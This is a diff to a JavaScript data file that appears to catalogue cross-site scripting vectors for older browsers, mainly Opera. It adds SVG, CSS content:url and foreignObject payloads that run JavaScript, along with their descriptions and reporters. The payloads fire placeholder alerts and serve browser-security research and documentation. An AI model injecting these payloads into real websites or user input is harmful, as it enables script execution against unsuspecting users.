@@ -1257,9 +1257,9 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<li style=list-style:url() onerror=%js_alert%>',
+        'data'       : '<li style=list-style:url() onerror=%js_alert%>\n<div style=content:url(data:image/svg+xml,%3Csvg%3E%3C/svg%3E);visibility:hidden onload=%js_alert%></div>',
         'description': {
-            'en' : 'Opera 10.5 and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well.',
+            'en' : 'Opera 10.5 and earlier versions fire an error event for <LI> tags in case the background URL via style attribute cannot be loaded. The same works with "list-style-image" too. On Opera 10.10 and earlier more tag/style combinations like background:url() and background-image:url() work as well. Also works combination like content:url(svg).',
             'ja' : '',
             'ru' : '',
             'de' : ''
@@ -1274,7 +1274,7 @@ var items =
         'browsers'   : {
             'opera': ['8.x', '9.x', '10.x', 'mobile'] 
         },
-        'tags'       : ['xss', 'javascript', 'css', 'background', 'opera', 'onerror'],
+        'tags'       : ['xss', 'javascript', 'css', 'background', 'opera', 'onerror', 'content'],
         'reporter'   : 'LeverOne, .mario'
     },
     { /* ID 42 - Link hijacking via <BASE> and JavaScript URI  */
@@ -2084,7 +2084,7 @@ var items =
         },
         'data'       : '<?xml version="1.0"?>\n<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform version=\'1.0\' xmlns:xsl=\'http://www.w3.org/1999/XSL/Transform\' id=\'xss\'%3E%3Cxsl:output method=\'html\'/%3E%3Cxsl:template match=\'/\'%3E%3Cscript%3E%js_alert%%3C/script%3E%3C/xsl:template%3E%3C/xsl:transform%3E"?>\n<root/>',
         'description': {
-            'en' : 'Opera support xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "# xss"), when the stylesheet implemented in the current document.',
+            'en' : 'Opera supports xml-stylesheet via data URIs. There are many ways to execute javascript using the XSL (XSLT). If you put this code in an external file on the same domain, then it will work in all browsers. It is also possible appeal to the code of the stylesheet by id (href = "# xss"), when the stylesheet implemented in the current document.',
             'ja' : '',
             'ru' : 'Opera поддерживает загрузку xml-таблицы стилей с помощью data-схемы. Существует очень много способов выполнить javascript, используя XSL (XSLT). Если вы разместите приведенный код таблицы стилей во внешнем файле, расположенном на том же домене, то он cработает во всех браузерах. Допустимо также обращение к коду таблицы стилей посредством ид (href="#xss"), если таблица стилей внедрена в текущий документ.',
             'de' : ''
@@ -2769,7 +2769,7 @@ var items =
             'ru' : 'Активный скриптинг в SVG с помощью XLink для Opera',
             'de' : ''
         },
-        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<animation xlink:href="%js_uri_alert%"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n</svg>',        
+        'data'       : '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">\n<animation xlink:href="%js_uri_alert%"/>\n<animation xlink:href="data:text/xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<image xlink:href="data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' onload=\'%js_alert%\'%3E%3C/svg%3E"/>\n<foreignObject xlink:href="%js_uri_alert%"/>\n<foreignObject xlink:href="data:text/xml,%3Cscript xmlns='http://www.w3.org/1999/xhtml'%3E%js_alert%%3C/script%3E"/>\n</svg>',        
         'description': {
             'en' : 'The content of the xml-links will automatically be included in the current document. The combination of "onLoad" (value of xlink:actuate) and "embed" (value of xlink:show) forms of potentially unsafe SVG-tags.',
             'ja' : '',
@@ -2817,6 +2817,42 @@ var items =
             'safari' : ['3.4', '4.x'],
         },
         'tags'       : ['xss', 'svg', 'event', 'safari', 'chrome'],
+        'reporter'   : 'LeverOne'
+    },
+    { /* ID 90 - SVG-image is also a XML-document, but with disabled javascript */
+        'id'         : 90,
+        'category'   : 'css', 
+        'name'       : {
+            'en' : 'SVG-image is also a XML-document, but with disabled javascript',
+            'ja' : '',
+            'ru' : 'SVG-изображение это такой же XML-документ, но с выключенным javascript',
+            'de' : ''
+        },
+        'data'       : '<div style=content:url(test2.svg)></div>',
+        'attachment' : {
+            'required_mime' : 'image/svg+xml',
+            'samedomain'    : '1',            
+            'path'          : 'http://heideri.ch/jso/test2.svg',
+            'name'          : 'test2.svg',
+            'raw'           : '<form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="%js_uri_alert%"><input value="XXX" type="submit"/></form>'
+        },
+        'description': {
+            'en' : 'Opera supports CSS-property "content" inside style attribute. As its value can be specified image object, which replace the html-tag.',
+            'ja' : '',
+            'ru' : 'Opera поддерживает CSS-свойство "content" в стилевом атрибуте. В качестве его значения может быть указан объект, который заместит html-тег.',
+            'de' : ''
+        },
+        'urls'    : [],
+        'howtofix'   : {
+            'en' : '',
+            'ja' : '',
+            'ru' : '',
+            'de' : ''
+        },                        
+        'browsers'   : {
+	    'opera'  : ['10.x']
+        },
+        'tags'       : ['xss', 'svg', 'css', 'opera', 'content'],
         'reporter'   : 'LeverOne'
     }
 ]
